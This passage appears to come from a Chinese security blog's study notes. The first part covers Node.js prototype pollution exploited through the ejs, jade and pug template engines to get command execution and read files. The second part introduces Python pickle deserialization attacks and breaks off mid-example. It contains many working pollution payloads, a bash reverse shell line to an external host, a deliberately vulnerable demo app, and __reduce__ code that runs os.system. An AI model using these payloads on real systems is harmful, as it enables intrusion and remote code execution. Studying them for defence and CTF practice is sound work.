__tmp2&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//用return拿到回显</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;x\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)\nx&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//其他示例</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); //&quot;</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;</span>&#125;&#125;&#125;<br><br></code></pre></td></tr></table></figure><p>同样 ejs 模板还存在另一处 RCE</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> escapeFn = opts.<span class="hljs-property">escapeFunction</span>;<br><span class="hljs-keyword">var</span> ctor;<br>...<br>    <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">client</span>) &#123;<br>    src = <span class="hljs-string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="hljs-title function_">toString</span>() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span> + src;<br>    <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">compileDebug</span>) &#123;<br>        src = <span class="hljs-string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="hljs-title function_">toString</span>() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span> + src;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>伪造 <code>opts.escapeFunction</code> 也可以进行 RCE</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1\nreturn global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;debug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;debug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="配合-jade-模板引擎"><a href="#配合-jade-模板引擎" class="headerlink" title="配合 jade 模板引擎"></a>配合 jade 模板引擎</h3><p>示例代码：</p><ul><li>app.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> jade = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jade&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;jade&quot;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;))&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.jade&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;whoami test&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>index.jade</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">h1 #&#123;message&#125;<br>p #&#123;message&#125;<br></code></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl">调用链<span class="hljs-number">1</span>：<br>__<span class="hljs-function"><span class="hljs-title">express</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">renderFile</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">handleTemplateCache</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">compile</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">parse</span>() -&gt;</span> <span class="hljs-function"><span class="hljs-title">compiler</span>.compile() -&gt;</span> visit()<br>调用链<span class="hljs-number">2</span>：<br>在visit中跟进会发现中途会进入visitTag，而在visitTag中存在一个undefined变量；继续跟进visitCode函数<br>任意文件读污染链：<br>在visit函数中，当我们能控制line或者filename时，可以利用报错信息来读出任意文件的部分内容<br></code></pre></td></tr></table></figure><p>最终的 Payload 如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//调用链1</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;))\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()//&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//调用链2</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;code&quot;</span>:&#123;<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString();&quot;</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;code&quot;</span>:&#123;<span class="hljs-string">&quot;buffer&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;1)))\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString();//&quot;</span>&#125;&#125;&#125;<br><br><span class="hljs-comment">//任意文件读污染链</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;1,\&quot;./app.js\&quot;))//&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;./app.js&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//调用链1，针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Doctype&quot;</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;))\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()//&quot;</span>&#125;&#125;&#125;<br><br><span class="hljs-comment">//其余示例</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;))&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;</span>&#125;&#125;&#125;<br><br></code></pre></td></tr></table></figure><h3 id="配合-pug-模板引擎"><a href="#配合-pug-模板引擎" class="headerlink" title="配合 pug 模板引擎"></a>配合 pug 模板引擎</h3><p><strong>Jade</strong> 是pug最初的名称。由于商标问题，Jade 在 2016 年更名为 <strong>Pug</strong>。两者的语法几乎完全一样，Pug 只是 Jade 的后续版本。</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-comment">//任意文件读取</span><br>&#123;<br>    <span class="hljs-string">&quot;song.__proto__.name&quot;</span>:<span class="hljs-string">&quot;Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild&quot;</span>,<br>    <span class="hljs-string">&quot;&#123;&#125;.__proto__.self&quot;</span>:true,<br>    <span class="hljs-string">&quot;&#123;&#125;.__proto__.filename&quot;</span>:<span class="hljs-string">&quot;./flag&quot;</span><br>&#125;<br><span class="hljs-comment">//AST Injection</span><br>&#123;<br>    <span class="hljs-string">&quot;song.__proto__.name&quot;</span>:<span class="hljs-string">&quot;Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild&quot;</span>,<br>    <span class="hljs-string">&quot;&#123;&#125;.__proto__.block&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Text&quot;</span>,<br>        <span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;process.mainModule.require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">//另一条链</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;</span>song.__proto__.name<span class="hljs-string">&quot;:&quot;</span>Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild<span class="hljs-string">&quot;,</span><br><span class="hljs-string">    &quot;</span>__proto__.code<span class="hljs-string">&quot;:&#123;</span><br><span class="hljs-string">        &quot;</span>val<span class="hljs-string">&quot;:&quot;</span>;process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<span class="hljs-string">&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">//因为jade和pug很像像，所以在jade模板引擎里面有的链也可以打得通</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;</span>__proto__<span class="hljs-string">&quot;:&#123;</span><br><span class="hljs-string">        &quot;</span>self<span class="hljs-string">&quot;:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;,</span><br><span class="hljs-string">        &quot;</span>code<span class="hljs-string">&quot;:&#123;</span><br><span class="hljs-string">            &quot;</span>val<span class="hljs-string">&quot;:&quot;</span>;process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://segmentfault.com/a/1190000042725370">javascript - 彻底搞懂JS原型与原型链 - 个人文章 - SegmentFault 思否</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1#reply-list">深入理解 JavaScript Prototype 污染攻击 | 离别歌</a></p><p><a href="https://nodejs.org/api/modules.html#requireid">Modules: CommonJS modules | Node.js v24.3.0 Documentation</a></p><p><a href="https://xz.aliyun.com/news/9482">谭谈 Javascript 原型链与原型链污染-先知社区</a></p><p><a href="https://www.anquanke.com/post/id/248170#h2-0">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p><p><a href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘-安全KER - 安全资讯平台</a></p><p><a href="https://h4cking2thegate.github.io/posts/39008/index.html">Nodejs原型链污染总结 | H4cking to the Gate</a></p><p><a href="https://www.anquanke.com/post/id/246492">从一道题开始的pug原型污染链挖掘-安全KER - 安全资讯平台</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python反序列化学习总结</title>
    <link href="/2025/07/13/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/07/13/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>现实需求</strong></p><p>每种编程语言都有各自的数据类型，其中面向对象的编程语言还允许开发者自定义数据类型（如：自定义类），Python也是一样。很多时候我们会有这样的需求：</p><ul><li>把内存中的各种数据类型的数据通过网络传送给其它机器或客户端；</li><li>把内存中的各种数据类型的数据保存到本地磁盘持久化；</li></ul><p><strong>数据格式</strong></p><p>如果要将一个系统内的数据通过网络传输给其它系统或客户端，我们通常都需要先把这些数据转化为字符串或字节串，而且需要规定一种统一的数据格式才能让数据接收端正确解析并理解这些数据的含义。</p><p><em><strong>XML</strong></em> 是早期被广泛使用的数据交换格式，在早期的系统集成论文中经常可以看到它的身影；如今大家使用更多的数据交换格式是<em><strong>JSON（JavaScript Object Notation）</strong></em>，它是一种轻量级的数据交换格式。JSON相对于XML而言，更加加单、易于阅读和编写，同时也易于机器解析和生成。除此之外，我们也可以自定义内部使用的数据交换格式。</p><p>如果是想把数据持久化到本地磁盘，这部分数据通常只是供系统内部使用，因此数据转换协议以及转换后的数据格式也就不要求是标准、统一的，只要本系统内部能够正确识别即可。但是，系统内部的转换协议通常会随着编程语言版本的升级而发生变化（改进算法、提高效率），因此通常会涉及转换协议与编程语言的版本兼容问题，下面要介绍的pickle协议就是这样一个例子。</p><h2 id="序列化-反序列化"><a href="#序列化-反序列化" class="headerlink" title="序列化&#x2F;反序列化"></a>序列化&#x2F;反序列化</h2><p>将对象转换为可通过网络传输或可以存储到本地磁盘的数据格式（如：XML、JSON或特定格式的字节串）的过程称为序列化；反之，则称为反序列化。</p><p>严谨一点说，</p><p><strong>序列化</strong> (Serialization)是将<strong>对象的状态信息</strong>转换为<strong>可以存储或传输的形式</strong>的过程。</p><p><strong>反序列化</strong> (Deserialization)是将<strong>有序的二进制序列</strong>转换成<strong>某种对象</strong>（字典，列表等）的过程。</p><h2 id="相关模块"><a href="#相关模块" class="headerlink" title="相关模块"></a>相关模块</h2><p>本节要介绍的就是Python内置的几个用于进行数据序列化的模块：</p><table><thead><tr><th>模块名称</th><th>描述</th><th>提供的api</th></tr></thead><tbody><tr><td>json</td><td>用于实现Python数据类型与通用（json）字符串之间的转换</td><td>dumps()、dump()、loads()、load()</td></tr><tr><td>pickle（cpickle）</td><td>用于实现Python数据类型与Python特定二进制格式之间的转换</td><td>dumps()、dump()、loads()、load()</td></tr><tr><td>shelve</td><td>专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷</td><td>open()</td></tr></tbody></table><p>Python 中有很多能进行序列化的模块，比如 <a href="https://www.cnblogs.com/gcgc/p/10973418.html">Json、pickle&#x2F;cPickle、Shelve</a>、<a href="https://docs.python.org/zh-tw/3/library/marshal.html">Marshal</a></p><p>其中json模块应该是最为人所知的，它主要提供python字典，列表等数据类型和字符串之间互相转换的能力；而marshal和pickle模块则可以对python中的类和对象进行序列化和反序列化。</p><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</p><p>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。在python反序列化安全这方面， <a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a>&#x2F;cPickle 模块较常使用，下面我们主要以它为例进行讲解。</p><p>在 pickle 模块中 , 常用以下四个方法</p><ul><li><code>pickle.dump(obj, file)</code> : 将对象序列化后保存到文件</li><li><code>pickle.load(file)</code> : 读取文件， 将文件中的序列化内容反序列化为对象</li><li><code>pickle.dumps(obj)</code> : 将对象序列化成字符串格式的字节流</li><li><code>pickle.loads(bytes_obj)</code> : 将字符串格式的字节流反序列化为对象<br>注意：file文件需要以 2 进制方式打开，如 <code>wb</code>、<code>rb</code></li></ul><p>在 Python 中，一切皆对象，因此能使用 pickle 序列化的数据类型有<a href="https://docs.python.org/zh-cn/3/library/pickle.html#what-can-be-pickled-and-unpickled">很多</a></p><ul><li>内置常量（None、True 和 False等）</li><li>整数、浮点数、复数</li><li>字符串、字节串、字节数组（即str、byte、byte array）</li><li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块最外层的函数（使用 def 定义，lambda 函数定义的则不可以）</li><li>定义在模块最外层的内置函数</li><li>定义在模块最外层的类</li><li>某些类实例，这些类的 <code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被封存</li></ul><p>注意，文件、套接字、以及代码对象不能被序列化！</p><h1 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>我们都知道，Java中的反序列化漏洞主要在于反序列化时会调用对象的readObject方法，在PHP中则有更多的魔术方法在反序列化等各种情况下调用。</p><p>而在python中，同样有几个内置方法会在对象被反序列化时调用。他们分别是：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">__reduce__()  <br>__reduce_ex__() <br>__setstate__()<br>__getstate__() <br></code></pre></td></tr></table></figure><p>具体的用法可以参考官方文档中的描述：</p><p><a href="https://docs.python.org/zh-cn/dev/library/pickle.html#object.__setstate__">pickle — Python 对象序列化 — Python 3.15.0a0 文档</a></p><table><thead><tr><th>方法</th><th>主要用途</th><th>pickle 调用时机</th><th>典型场景</th></tr></thead><tbody><tr><td><code>__reduce__</code></td><td>控制整体序列化&#x2F;还原</td><td>序列化、反序列化</td><td>复杂对象、特殊还原方式</td></tr><tr><td><code>__reduce_ex__</code></td><td>同上，兼容协议版本</td><td>序列化、反序列化，但优先于 <code>__reduce__</code></td><td>针对不同 pickle 协议做兼容处理</td></tr><tr><td><code>__getstate__</code></td><td>控制保存哪些属性</td><td>仅序列化时</td><td>部分属性不序列化、定制序列化状态</td></tr><tr><td><code>__setstate__</code></td><td>控制如何还原属性</td><td>仅反序列化时</td><td>属性还原、补充默认&#x2F;临时变量</td></tr></tbody></table><p>参考PHP的反序列化，如果我们可以在类中构造这些魔术方法，并在方法中执行恶意代码。那么实例在反序列化时就会执行我们的代码了。</p><p>示例如下，</p><p>reduce：</p><p>注意：<code>pickle.dumps(a)</code> 调用 <code>__reduce__</code>，把你的对象变成一个“还原说明书”（在例子里，就是 <code>(os.system, (&quot;whoami&quot;,))</code>）；只有在 <code>pickle.loads(ser_a)</code> 时，pickle 才会按照这个“说明书”去执行 <code>os.system(&quot;whoami&quot;)</code>，以“还原”你的对象！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;whoami&quot;</span>,)) <span class="hljs-comment"># 只在反序列化时才会执行</span><br><br>a = Rce()<br>ser_a= pickle.dumps(a)<br><span class="hljs-built_in">print</span>(ser_a)<br>pickle.loads(ser_a)<br></code></pre></td></tr></table></figure><p>reduce_ex：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce_ex__</span>(<span class="hljs-params">self, protocol</span>): <span class="hljs-comment"># 注意必须有protocol参数</span><br>        <span class="hljs-keyword">return</span> (os.system, (<span 